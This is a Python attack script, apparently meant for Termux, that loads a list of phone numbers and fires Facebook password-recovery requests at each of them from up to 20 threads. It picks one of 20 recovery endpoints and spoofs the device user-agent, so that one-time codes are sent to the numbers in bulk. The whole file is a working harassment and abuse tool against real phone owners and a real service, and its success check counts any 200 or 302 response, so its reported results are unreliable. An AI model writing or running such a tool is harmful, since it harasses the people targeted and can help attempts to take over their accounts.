import requests
import sys
import time
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

# ASCII Banner (stylized)
BANNER = r"""
████████╗ ██████╗ ██████╗ ██╗   ██╗██╗  ██╗     ██████╗  ██████╗ ███████╗██████╗ 
╚══██╔══╝██╔═══██╗██╔══██╗██║   ██║██║ ██╔╝    ██╔═══██╗██╔═══██╗██╔════╝██╔══██╗
   ██║   ██║   ██║██████╔╝██║   ██║█████╔╝     ██║   ██║██║   ██║█████╗  ██████╔╝
   ██║   ██║   ██║██╔═══╝ ██║   ██║██╔═██╗     ██║   ██║██║   ██║██╔══╝  ██╔══██╗
   ██║   ╚██████╔╝██║     ╚██████╔╝██║  ██╗    ╚██████╔╝╚██████╔╝███████╗██║  ██║
   ╚═╝    ╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═╝     ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
                Termux OTP Dispatcher Tool - Facebook Password Recovery
"""

# Facebook password recovery domains/endpoints (simplified examples)
DOMAINS = {
    "1": "https://www.facebook.com/login/identify/",
    "2": "https://m.facebook.com/login/identify/",
    "3": "https://mbasic.facebook.com/login/identify/",
    "4": "https://touch.facebook.com/login/identify/",
    "5": "https://www.facebook.com/recover/initiate",
    "6": "https://m.facebook.com/recover/initiate",
    "7": "https://mbasic.facebook.com/recover/initiate",
    "8": "https://touch.facebook.com/recover/initiate",
    "9": "https://www.facebook.com/login/help/",
    "10": "https://m.facebook.com/login/help/",
    "11": "https://mbasic.facebook.com/login/help/",
    "12": "https://touch.facebook.com/login/help/",
    "13": "https://www.facebook.com/login/identify/?ctx=recover",
    "14": "https://m.facebook.com/login/identify/?ctx=recover",
    "15": "https://mbasic.facebook.com/login/identify/?ctx=recover",
    "16": "https://touch.facebook.com/login/identify/?ctx=recover",
    "17": "https://www.facebook.com/login/identify/?ars=facebook_login",
    "18": "https://m.facebook.com/login/identify/?ars=facebook_login",
    "19": "https://mbasic.facebook.com/login/identify/?ars=facebook_login",
    "20": "https://touch.facebook.com/login/identify/?ars=facebook_login",
}

# User agents for device spoofing
USER_AGENTS = {
    "1": ("iPhone Safari", "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) "
                         "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"),
    "2": ("Android Chrome", "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 "
                           "(KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36"),
    "3": ("PC Chrome", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"),
    "4": ("PC Firefox", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"),
    "5": ("iPad Safari", "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 "
                        "(KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"),
}

HEADERS_BASE = {
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded",
}

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    clear_screen()
    print(BANNER)

def select_domain():
    print("Select Facebook Password Recovery Domain/Endpoint:")
    for k, v in DOMAINS.items():
        print(f"  [{k}] {v}")
    while True:
        choice = input("Enter choice number (1-20): ").strip()
        if choice in DOMAINS:
            return DOMAINS[choice]
        print("Invalid choice. Try again.")

def select_user_agent():
    print("\nSelect Device User-Agent to Spoof:")
    for k, (name, _) in USER_AGENTS.items():
        print(f"  [{k}] {name}")
    while True:
        choice = input("Enter choice number (1-5): ").strip()
        if choice in USER_AGENTS:
            return USER_AGENTS[choice][1]
        print("Invalid choice. Try again.")

def load_phone_numbers(file_path):
    if not os.path.isfile(file_path):
        print(f"File not found: {file_path}")
        sys.exit(1)
    with open(file_path, "r", encoding="utf-8") as f:
        numbers = [line.strip() for line in f if line.strip()]
    if not numbers:
        print("No phone numbers found in the file.")
        sys.exit(1)
    return numbers

def send_otp(session, domain, user_agent, phone):
    headers = HEADERS_BASE.copy()
    headers["User-Agent"] = user_agent

    # Prepare data payload for Facebook OTP request
    # Facebook expects 'email' or 'phone' in the form data for password recovery
    # We use 'email' field with phone number as string (Facebook accepts phone numbers here)
    data = {
        "email": phone,
        "did_submit": "Search"
    }

    try:
        # Some endpoints require GET first to get cookies or tokens, but for simplicity,
        # we just POST directly to the domain with data.
        resp = session.post(domain, headers=headers, data=data, timeout=15)
        # Check response for success indicators (simplified)
        if resp.status_code == 200 and ("We sent a code" in resp.text or "sent a code" in resp.text or "Check your phone" in resp.text):
            return True
        # Some endpoints redirect or respond differently, treat 200 as success attempt
        if resp.status_code in (200, 302):
            return True
    except requests.RequestException:
        return False
    return False

def worker(phone, domain, user_agent):
    session = requests.Session()
    success = send_otp(session, domain, user_agent, phone)
    return phone, success

def main():
    print_banner()
    domain = select_domain()
    user_agent = select_user_agent()
    print("\nEnter path to file containing phone numbers (one per line):")
    file_path = input("File path: ").strip()
    phone_numbers = load_phone_numbers(file_path)

    print(f"\nLoaded {len(phone_numbers)} phone numbers.")
    print("Starting OTP dispatch...\n")

    max_workers = min(20, len(phone_numbers))
    success_count = 0
    failure_count = 0

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(worker, phone, domain, user_agent): phone for phone in phone_numbers}
        for future in as_completed(futures):
            phone = futures[future]
            try:
                _, success = future.result()
                if success:
                    print(f"[+] OTP sent successfully to {phone}")
                    success_count += 1
                else:
                    print(f"[-] Failed to send OTP to {phone}")
                    failure_count += 1
            except Exception as e:
                print(f"[-] Exception for {phone}: {e}")
                failure_count += 1

    print("\nDispatch complete.")
    print(f"Total numbers processed: {len(phone_numbers)}")
    print(f"Successful OTP sends: {success_count}")
    print(f"Failed OTP sends: {failure_count}")

if __name__ == "__main__":
    main()
